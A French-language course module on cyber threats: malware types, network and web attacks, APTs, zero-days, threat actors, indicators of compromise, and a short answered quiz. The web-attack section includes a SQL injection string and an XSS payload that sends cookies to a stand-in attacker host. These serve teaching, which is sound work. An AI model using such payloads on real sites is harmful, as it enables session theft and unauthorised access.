# Module 2 : Menaces et Types d'Attaques

[← Module précédent](module1-introduction.md) | [Retour au sommaire](../README.md) | [Module suivant →](module3-securite-reseau.md)

---

## 2.1 Panorama des Cybermenaces

Les cybermenaces évoluent constamment. Comprendre les différents types d'attaques est essentiel pour s'en protéger efficacement. On peut les classer selon leur objectif, leur méthode ou leur cible.

---

## 2.2 Les Malwares (Logiciels Malveillants)

Un **malware** (malicious software) est tout programme conçu pour nuire à un système informatique ou à ses utilisateurs.

### Virus
Un virus s'attache à des fichiers légitimes et se propage lorsque ces fichiers sont exécutés.

```
Fonctionnement d'un virus :
Fichier sain → Infection → Fichier infecté → Exécution → Propagation
```

### Ver (Worm)
Contrairement aux virus, un ver se propage **sans intervention humaine** via le réseau.

> **Exemple historique** : WannaCry (2017) a infecté 300 000 ordinateurs dans 150 pays en exploitant une vulnérabilité Windows.

### Cheval de Troie (Trojan)
Se déguise en logiciel légitime pour tromper l'utilisateur et s'installer sur le système.

> **Exemple** : Un faux logiciel de nettoyage qui installe en réalité une porte dérobée.

### Ransomware (Rançongiciel)
Chiffre les données de la victime et exige une rançon pour les déchiffrer.

```
Cycle d'une attaque ransomware :
1. Infection (phishing, vulnérabilité)
2. Reconnaissance du réseau
3. Chiffrement des fichiers
4. Affichage de la demande de rançon
5. (Éventuel) Paiement et déchiffrement
```

> **Exemple** : L'attaque contre l'hôpital de Corbeil-Essonnes en 2022.

### Spyware
Collecte secrètement des informations sur l'utilisateur (mots de passe, habitudes de navigation).

### Adware
Affiche des publicités non désirées et peut ralentir considérablement le système.

### Rootkit
Se cache profondément dans le système pour maintenir un accès privilégié non détecté.

### Keylogger
Enregistre toutes les frappes clavier pour voler des identifiants et informations sensibles.

---

## 2.3 Les Attaques Réseau

### Attaque Man-in-the-Middle (MitM)
L'attaquant s'interpose entre deux parties pour intercepter ou modifier les communications.

```
Communication normale :
Alice ←————————→ Bob

Attaque MitM :
Alice ←——→ Attaquant ←——→ Bob
           (intercepte et
            peut modifier)
```

### Attaque par Déni de Service (DoS / DDoS)
Saturer un service ou un réseau pour le rendre indisponible.

- **DoS** : attaque depuis une seule machine
- **DDoS** (Distributed DoS) : attaque coordonnée depuis des milliers de machines (botnet)

> **Exemple** : Une attaque DDoS peut envoyer des millions de requêtes par seconde pour paralyser un site web.

### Sniffing (Écoute réseau)
Capturer le trafic réseau pour analyser les données non chiffrées.

### Spoofing (Usurpation d'identité)
Se faire passer pour une entité de confiance :
- **IP Spoofing** : falsification d'adresse IP
- **ARP Spoofing** : empoisonnement de la table ARP
- **DNS Spoofing** : redirection vers de faux serveurs

### Attaque par Rejeu (Replay Attack)
Intercepter et réutiliser des données d'authentification valides pour se connecter illégitimement.

---

## 2.4 Les Attaques sur les Applications Web

### Injection SQL
Insérer du code SQL malveillant dans un formulaire pour manipuler la base de données.

```sql
-- Saisie normale attendue :
Nom d'utilisateur: alice

-- Injection SQL :
Nom d'utilisateur: alice' OR '1'='1

-- Requête résultante (permet d'accéder sans mot de passe) :
SELECT * FROM users WHERE username='alice' OR '1'='1' AND password='...'
```

### Cross-Site Scripting (XSS)
Injecter du code JavaScript malveillant dans une page web pour attaquer d'autres utilisateurs.

```html
<!-- Exemple de payload XSS dans un commentaire -->
<script>document.location='https://attaquant.com/steal?cookie='+document.cookie</script>
```

### Cross-Site Request Forgery (CSRF)
Forcer un utilisateur authentifié à effectuer des actions non désirées à son insu.

### Attaque par Force Brute
Tester systématiquement toutes les combinaisons possibles de mots de passe.

### Attaque par Dictionnaire
Tester des listes de mots de passe courants pour deviner les identifiants.

---

## 2.5 Les Menaces Avancées

### APT (Advanced Persistent Threat)
Attaques sophistiquées et discrètes, souvent menées par des États-nations, visant à s'infiltrer durablement dans des cibles stratégiques.

**Caractéristiques** :
- Hautement ciblées
- Longue durée (mois voire années)
- Techniques multiples combinées
- Très difficiles à détecter

### Zero-Day
Exploitation d'une vulnérabilité inconnue du fabricant, donc sans correctif disponible.

```
Chronologie d'une vulnérabilité :
Découverte ——→ Exploit 0-day ——→ Divulgation ——→ Patch ——→ Déploiement
(par l'attaquant)                 (publication)  (correction)
```

### Supply Chain Attack (Attaque de la chaîne d'approvisionnement)
Compromettre un logiciel ou matériel tiers pour atteindre les cibles finales.

> **Exemple** : L'attaque SolarWinds (2020) a compromis des milliers d'organisations via une mise à jour logicielle piégée.

---

## 2.6 Classification des Menaces

| Menace | Motivation | Sophistication | Exemples |
|--------|-----------|----------------|---------|
| Script Kiddie | Curiosité, notoriété | Faible | Attaques basiques avec des outils existants |
| Cybercriminel | Gain financier | Moyenne à élevée | Ransomware, fraude bancaire |
| Hacktiviste | Idéologie | Variable | Défacement de sites, DDoS militant |
| État-nation | Espionnage, sabotage | Très élevée | APT, Zero-day, attaques d'infrastructures |
| Initié malveillant | Vengeance, gain | Variable | Vol de données, sabotage interne |

---

## 2.7 Indicateurs de Compromission (IoC)

Les **Indicateurs de Compromission** sont des traces laissées par une activité malveillante :

- Adresses IP suspectes ou blacklistées
- Noms de domaine malveillants
- Hachages de fichiers malveillants (MD5, SHA256)
- Comportements inhabituels (connexions à des heures atypiques, transferts de données massifs)
- Fichiers ou processus inconnus

---

## 2.8 Quiz - Module 2

**Question 1** : Quel type de malware chiffre vos fichiers et demande une rançon ?
- A) Spyware
- B) Ransomware ✅
- C) Adware
- D) Rootkit

**Question 2** : Qu'est-ce qu'une attaque DDoS ?
- A) Une attaque qui chiffre les données
- B) Une attaque qui intercepte les communications
- C) Une attaque qui sature un service depuis de nombreuses sources ✅
- D) Une attaque qui vole les mots de passe

**Question 3** : Qu'est-ce qu'une vulnérabilité Zero-Day ?
- A) Une vulnérabilité corrigée depuis longtemps
- B) Une vulnérabilité inconnue du fabricant, sans patch disponible ✅
- C) Une attaque survenant à minuit
- D) Un virus vieux de plusieurs années

**Question 4** : Quelle attaque consiste à insérer du code malveillant dans une requête de base de données ?
- A) XSS
- B) DDoS
- C) Injection SQL ✅
- D) CSRF

---

## Résumé du Module 2

✅ Les malwares incluent virus, vers, chevaux de Troie, ransomwares, spywares et rootkits

✅ Les attaques réseau incluent MitM, DDoS, sniffing et spoofing

✅ Les attaques web incluent l'injection SQL, XSS et CSRF

✅ Les APT et Zero-Day sont des menaces avancées très sophistiquées

✅ Les IoC permettent de détecter une compromission

---

[← Module précédent : Introduction](module1-introduction.md) | [Retour au sommaire](../README.md) | [Module suivant : Sécurité Réseau →](module3-securite-reseau.md)
